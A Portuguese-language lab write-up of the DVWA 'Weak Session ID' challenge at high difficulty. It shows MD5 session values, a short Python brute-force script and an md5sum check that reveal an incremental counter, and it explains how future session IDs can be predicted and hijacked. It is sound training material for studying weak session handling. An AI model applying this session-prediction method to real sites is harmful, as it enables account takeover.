# DVWA - Weak Session ID (High) — Diário de Execução

## Contexto

O objetivo foi analisar a geração de identificadores de sessão no nível HIGH e verificar se eles possuem entropia suficiente ou se são previsíveis.

---

## Comportamento observado

Após clicar em "Generate", foram obtidos os seguintes valores:

```
9bf31c7ff062936a96d3c8bd1f8f2ff3
c74d97b01eae257e44aa9d5bade97baf
70efdf2ec9b086079795c442636b55fb
```

Todos possuem formato de hash MD5 (32 caracteres hexadecimais).

---

## Investigação

Inicialmente os valores aparentam ser aleatórios, porém o código indica que o valor de entrada é incremental.

Foi criado um script para tentar reverter o valor:

```python
import hashlib

target = "9bf31c7ff062936a96d3c8bd1f8f2ff3"

for i in range(0, 100000):
    if hashlib.md5(str(i).encode()).hexdigest() == target:
        print("Found:", i)
        break
```

---

## Resultado

```
Found: 15
```

Validação manual:

```bash
echo -n 15 | md5sum
```

Resultado:

```
9bf31c7ff062936a96d3c8bd1f8f2ff3
```

---

## Conclusão da prova

Foi comprovado que:

```
dvwaSession = md5(n)
```

Onde:

```
n = contador incremental previsível
```

---

## Impacto

Mesmo utilizando MD5, o sistema é vulnerável porque:

- o valor de entrada não é aleatório
- o hash apenas transforma o valor, não adiciona entropia
- é possível prever valores futuros

---

## Exploração

Se o valor atual é:

```
md5(15)
```

Então os próximos valores serão:

```
md5(16)
md5(17)
md5(18)
...
```

Isso permite:

- prever sessões futuras
- gerar valores válidos
- potencialmente sequestrar sessões

---

## Conclusão final

O uso de MD5 não garante segurança quando o valor de entrada é previsível.

A aplicação gera identificadores de sessão determinísticos, caracterizando uma vulnerabilidade de Weak Session ID.
